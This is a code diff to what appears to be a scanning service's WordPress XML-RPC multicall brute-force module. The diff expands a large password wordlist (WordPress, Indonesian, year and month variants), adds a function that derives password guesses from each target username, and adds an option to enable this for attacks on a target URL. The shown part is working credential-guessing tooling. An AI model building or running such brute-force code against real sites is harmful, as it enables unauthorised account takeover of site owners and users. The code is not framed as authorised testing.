@@ -902,39 +902,177 @@ async def get_scan_by_id(scan_id: str):
 # XMLRPC MULTICALL BRUTE FORCE
 # ==========================================
 
-# Common password wordlist for testing
-DEFAULT_PASSWORDS = [
+# Base common passwords
+BASE_PASSWORDS = [
     "123456", "password", "12345678", "qwerty", "123456789",
     "12345", "1234", "111111", "1234567", "dragon",
     "123123", "baseball", "abc123", "football", "monkey",
-    "letmein", "696969", "shadow", "master", "666666",
-    "qwertyuiop", "123321", "mustang", "1234567890", "michael",
-    "654321", "pussy", "superman", "1qaz2wsx", "7777777",
-    "fuckyou", "121212", "000000", "qazwsx", "123qwe",
-    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
+    "letmein", "shadow", "master", "666666", "qwertyuiop",
+    "123321", "mustang", "1234567890", "654321", "superman",
+    "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",
+    "123qwe", "killer", "trustno1", "jordan", "zxcvbnm",
     "asdfgh", "hunter", "buster", "soccer", "harley",
-    "batman", "andrew", "tigger", "sunshine", "iloveyou",
-    "fuckme", "2000", "charlie", "robert", "thomas",
-    "hockey", "ranger", "daniel", "starwars", "klaster",
-    "112233", "george", "asshole", "computer", "michelle",
-    "jessica", "pepper", "1111", "zxcvbn", "555555",
-    "11111111", "131313", "freedom", "777777", "pass",
-    "fuck", "maggie", "159753", "aaaaaa", "ginger",
-    "princess", "joshua", "cheese", "amanda", "summer",
-    "love", "ashley", "6969", "nicole", "chelsea",
-    "biteme", "matthew", "access", "yankees", "987654321",
-    "dallas", "austin", "thunder", "taylor", "matrix",
-    "admin", "administrator", "root", "toor", "pass123",
-    "admin123", "root123", "password123", "test", "test123",
-    "guest", "guest123", "user", "user123", "demo",
-    "wordpress", "wp", "wpadmin", "wpadmin123"
+    "batman", "tigger", "sunshine", "iloveyou", "charlie",
+    "robert", "thomas", "hockey", "ranger", "daniel",
+    "starwars", "112233", "computer", "jessica", "pepper",
+    "1111", "zxcvbn", "555555", "11111111", "131313",
+    "freedom", "777777", "pass", "maggie", "159753",
+    "aaaaaa", "ginger", "princess", "joshua", "cheese",
+    "amanda", "summer", "love", "ashley", "nicole",
+    "chelsea", "matthew", "access", "yankees", "987654321",
+    "dallas", "austin", "thunder", "taylor", "matrix"
 ]
+
+# WordPress specific passwords
+WP_SPECIFIC_PASSWORDS = [
+    # Common WP admin passwords
+    "admin", "administrator", "Admin", "Administrator", "ADMIN",
+    "admin123", "admin1234", "admin12345", "admin123456",
+    "Admin123", "Admin@123", "Admin123!", "admin@123",
+    "administrator123", "Administrator123",
+    "root", "Root", "root123", "Root123", "toor",
+    "password", "Password", "PASSWORD", "pass", "Pass",
+    "password1", "password12", "password123", "password1234",
+    "Password1", "Password12", "Password123", "Password1234",
+    "Password!", "Password1!", "P@ssw0rd", "P@ssword", "P@ssword1",
+    "pass123", "Pass123", "pass1234", "Pass1234",
+    
+    # WordPress related
+    "wordpress", "WordPress", "Wordpress", "WORDPRESS",
+    "wp", "WP", "Wp", "wpuser", "WPuser",
+    "wp123", "wp1234", "WP123", "WP1234",
+    "wpadmin", "WPadmin", "Wpadmin", "wp-admin",
+    "wppass", "WPpass", "wppassword",
+    "wordpress123", "Wordpress123", "WordPress123",
+    "wordpress1", "wordpress12", "wordpress1234",
+    "blog", "Blog", "blog123", "Blog123",
+    "website", "Website", "website123",
+    "site", "Site", "site123", "Site123",
+    "web", "Web", "web123", "webmaster",
+    "cms", "CMS", "cms123",
+    
+    # Test/Demo accounts
+    "test", "Test", "TEST", "test123", "Test123", "test1234",
+    "testing", "Testing", "testing123",
+    "demo", "Demo", "DEMO", "demo123", "Demo123",
+    "guest", "Guest", "guest123", "Guest123",
+    "user", "User", "USER", "user123", "User123",
+    "temp", "Temp", "temp123", "Temp123",
+    "default", "Default", "default123",
+    
+    # Common patterns with special chars
+    "!@#$%^&*", "123!@#", "abc!@#", "qwerty!@#",
+    "admin!@#", "pass!@#", "test!@#",
+    "@dmin123", "@dm1n", "adm1n", "4dmin", "4dm1n",
+    "p@ssword", "p@ss", "p@ss123", "p@ssw0rd",
+    
+    # Keyboard patterns
+    "qwerty", "QWERTY", "Qwerty", "qwerty123",
+    "asdfgh", "ASDFGH", "asdfgh123",
+    "zxcvbn", "ZXCVBN", "zxcvbn123",
+    "1q2w3e", "1q2w3e4r", "1q2w3e4r5t",
+    "q1w2e3", "q1w2e3r4", "1qaz2wsx", "1qaz@WSX",
+    "qazwsx", "qazwsxedc", "zaq12wsx",
+    
+    # Indonesian common
+    "rahasia", "Rahasia", "rahasia123",
+    "password1", "katasandi", "sandi123",
+    "indonesia", "Indo123", "jakarta",
+    
+    # Company/site patterns
+    "company", "Company", "company123",
+    "welcome", "Welcome", "welcome1", "Welcome1", "welcome123",
+    "changeme", "Changeme", "changeme123",
+    "letmein", "Letmein", "letmein123",
+]
+
+# Year-based passwords (2020-2026)
+YEAR_PASSWORDS = []
+for year in range(2020, 2027):
+    YEAR_PASSWORDS.extend([
+        str(year), f"pass{year}", f"Pass{year}", f"password{year}",
+        f"Password{year}", f"admin{year}", f"Admin{year}",
+        f"{year}admin", f"{year}pass", f"{year}password",
+        f"wp{year}", f"wordpress{year}", f"site{year}",
+        f"@{year}", f"!{year}", f"#{year}",
+    ])
+
+# Month passwords
+MONTH_PASSWORDS = []
+months = ["january", "february", "march", "april", "may", "june", 
+          "july", "august", "september", "october", "november", "december",
+          "jan", "feb", "mar", "apr", "jun", "jul", "aug", "sep", "oct", "nov", "dec"]
+for month in months:
+    MONTH_PASSWORDS.extend([
+        month, month.capitalize(), f"{month}123", f"{month.capitalize()}123",
+        f"{month}2024", f"{month}2025"
+    ])
+
+# Combine all default passwords
+DEFAULT_PASSWORDS = list(dict.fromkeys(
+    BASE_PASSWORDS + WP_SPECIFIC_PASSWORDS + YEAR_PASSWORDS + MONTH_PASSWORDS
+))
+
+
+def generate_username_based_passwords(username: str) -> List[str]:
+    """Generate password variations based on username"""
+    passwords = []
+    u = username.lower()
+    U = username.capitalize()
+    
+    # Direct username variations
+    passwords.extend([
+        username, u, U, username.upper(),
+        f"{u}123", f"{u}1234", f"{u}12345", f"{u}123456",
+        f"{U}123", f"{U}1234", f"{U}12345",
+        f"{u}!", f"{u}!!", f"{u}@", f"{u}#",
+        f"{u}@123", f"{u}!123", f"{u}#123",
+        f"{U}!", f"{U}@", f"{U}@123", f"{U}!123",
+        
+        # Reversed
+        u[::-1], f"{u[::-1]}123",
+        
+        # With numbers
+        f"{u}1", f"{u}2", f"{u}01", f"{u}00",
+        f"{u}99", f"{u}007", f"{u}666", f"{u}777",
+        
+        # Leetspeak variations
+        u.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0'),
+        u.replace('a', '4').replace('e', '3').replace('s', '$'),
+        
+        # Common suffixes
+        f"{u}admin", f"{u}pass", f"{u}password",
+        f"{u}wp", f"{u}wordpress", f"{u}site",
+        f"admin{u}", f"pass{u}", f"wp{u}",
+        
+        # Year suffixes
+        f"{u}2024", f"{u}2025", f"{u}2023",
+        f"{U}2024", f"{U}2025",
+        f"{u}@2024", f"{u}@2025",
+        
+        # Double
+        f"{u}{u}", f"{u}{u}123",
+        
+        # First letter caps with numbers
+        f"{U}1", f"{U}12", f"{U}123!", f"{U}1234!",
+        f"{U}@1", f"{U}@12", f"{U}@123",
+    ])
+    
+    # If username has numbers, try without
+    if any(c.isdigit() for c in username):
+        base = ''.join(c for c in username if not c.isdigit())
+        if base:
+            passwords.extend([base, f"{base}123", f"{base}1234"])
+    
+    return list(dict.fromkeys(passwords))
+
 
 class BruteForceRequest(BaseModel):
     target_url: str
     usernames: List[str]
     passwords: Optional[List[str]] = None
     use_default_wordlist: bool = True
+    generate_username_passwords: bool = True  # NEW: Generate passwords from usernames
     batch_size: int = 100  # passwords per multicall request
 
 class BruteForceResult(BaseModel):
